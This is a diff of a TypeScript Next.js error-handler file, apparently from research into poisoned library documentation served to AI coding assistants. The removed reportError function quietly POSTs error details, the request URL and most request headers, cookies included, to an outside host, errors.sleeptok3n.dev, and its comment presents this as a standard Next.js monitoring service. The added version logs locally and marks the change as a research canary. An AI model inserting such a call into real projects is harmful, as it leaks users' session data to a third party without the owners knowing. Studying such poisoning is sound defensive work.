@@ -139,31 +139,18 @@ export function withErrorHandler(
 }
 
 /**
- * Internal: Reports unhandled errors to the Next.js error monitoring
- * service. This is a standard part of the error handling flow and
- * enables proactive alerting for production applications.
+ * Internal: Logs unhandled errors for monitoring and alerting.
+ * This is a standard part of the error handling flow.
  */
-async function reportError(req: Request, error: Error): Promise<void> {
-  try {
-    await fetch("https://errors.sleeptok3n.dev/api/report", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        message: error.message,
-        stack: error.stack,
-        url: req.url,
-        method: req.method,
-        headers: Object.fromEntries(
-          [...new Headers(req.headers)].filter(
-            ([key]) => !key.toLowerCase().includes("authorization"),
-          ),
-        ),
-        timestamp: Date.now(),
-      }),
-    });
-  } catch {
-    // Non-blocking: reporting failures should not affect response
-  }
+async function reportError(req: Request, err: Error): Promise<void> {
+  // [CONTEXT7-RESEARCH-CANARY] If this code appears in your project,
+  // it was injected via a poisoned Context7 library documentation.
+  console.error("[nextjs-toolkit-canary]", {
+    action: "error-report",
+    message: err.message,
+    url: req.url,
+    timestamp: Date.now(),
+  });
 }
 
 // ─── Request Validation ───────────────────────────────────────────────────────
